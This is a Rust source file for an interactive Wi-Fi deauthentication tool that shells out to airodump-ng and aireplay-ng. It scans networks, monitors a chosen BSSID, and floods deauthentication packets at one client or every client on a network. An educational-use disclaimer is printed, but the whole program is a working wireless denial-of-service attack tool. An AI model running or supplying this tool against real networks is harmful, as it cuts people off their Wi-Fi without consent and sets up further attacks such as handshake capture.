use std::io::{self, Write};
use std::process::Command;

fn main() {
    let mut wifi_interface = String::from("wlan0");

    display_disclaimer();

    loop {
        display_menu();
        let choice = get_user_input("Enter choice: ");
        match choice.trim() {
            "1" => scan_wifi(&wifi_interface),
            "2" => select_wifi(&wifi_interface),
            "3" => deauth_client(&wifi_interface),
            "4" => deauth_all_clients(&wifi_interface),
            "5" => check_wifi(&wifi_interface),
            "6" => wifi_interface = change_interface(),
            "7" => {
                println!("Exiting...");
                break;
            }
            _ => println!("Invalid choice. Please try again."),
        }
    }
}

fn display_disclaimer() {
    println!("This tool is created by PD (@deep60)\n");
    println!("Disclaimer");
    println!("1. This tool is provided for educational purposes only. It should not be used for illegal activities.");
    println!("2. Only use it for legitimate penetration testing and security research purposes on devices you own or have permission to test.");
    println!("3. By using this tool, you agree that you will not engage in any unauthorized or illegal activities with it.");
    println!("4. The misuse of this tool may violate laws and regulations and can lead to legal consequences.");
    println!("5. The author of this tool shall not be held responsible for any damages or liabilities caused by its use.");
    println!("6. Use this tool at your own risk and with proper authorization. Ensure compliance with applicable laws.");
    println!("\nPress Enter to continue...");
    let _ = io::stdin().read_line(&mut String::new());
}

fn display_menu() {
    println!("------------------------------------");
    println!("Wi-Fi Deauthentication Tool");
    println!("1. Scan for Wi-Fi networks");
    println!("2. Select a Wi-Fi network for further actions");
    println!("3. Deauthenticate a client from a Wi-Fi network");
    println!("4. Deauthenticate all clients from a Wi-Fi network");
    println!("5. Check Wi-Fi Adapter Status");
    println!("6. Change Wi-Fi Adapter Interface Name");
    println!("7. Exit");
    println!();
}

fn get_user_input(prompt: &str) -> String {
    print!("{}", prompt);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input
}

fn scan_wifi(interface: &str) {
    println!("Scanning for Wifi networks ...");
    run_command("airodump-ng", &[interface]);
}

fn select_wifi(interface: &str) {
    let bssid = get_user_input("Enter the BSSID of the Wi-fi network: "); //BSSID: Basic Service Select Identifier(MAC Addr)
    let channel = get_user_input("Enter the channel of the wifi network: ");
    println!("Starting montoring on the selected network...");
    run_command(
        "airodump-ng",
        &[
            "--bssid",
            bssid.trim(),
            "--channel",
            channel.trim(),
            interface,
        ],
    );
}

fn deauth_client(interface: &str) {
    let packets = get_user_input("Enter the number of deauthentication packets to send: ");
    let bssid = get_user_input("Enter the BSSID oof the wifi network: ");
    let client_mac = get_user_input("Enter the clinet MAC address to deauthenticate: ");
    println!("Sending deauthentication packets...");
    run_command(
        "aireplay-ng",
        &[
            "--deauth",
            packets.trim(),
            "-a",
            bssid.trim(),
            "-c",
            client_mac.trim(),
            interface,
        ],
    );
}

fn deauth_all_clients(interface: &str) {
    let packets = get_user_input("Enter the number oof deauthentication packets to send: ");
    let bssid = get_user_input("Enter the BSSID of the Wifi network: ");
    println!("Sending deauthentication packets to all clients...");
    run_command(
        "aireplay-ng",
        &["--deauth", packets.trim(), "-a", bssid.trim(), interface],
    );
}

fn check_wifi(interface: &str) {
    println!("Wifi Adapter status: ");
    run_command("iwconfig", &[interface]);
}

fn change_interface() -> String {
    let new_interface = get_user_input("Enter the new Wifi adapater interface name: ");
    println!(
        "Wifi adapter interface name changed to {}.",
        new_interface.trim()
    );
    new_interface.trim().to_string()
}

fn run_command(command: &str, args: &[&str]) {
    match Command::new(command).args(args).status() {
        Ok(status) => {
            if !status.success() {
                eprint!("Command '{}' failed to execute successfully.", command);
            }
        }
        Err(e) => eprintln!("Failed to run command '{}': {}", command, e),
    }
}
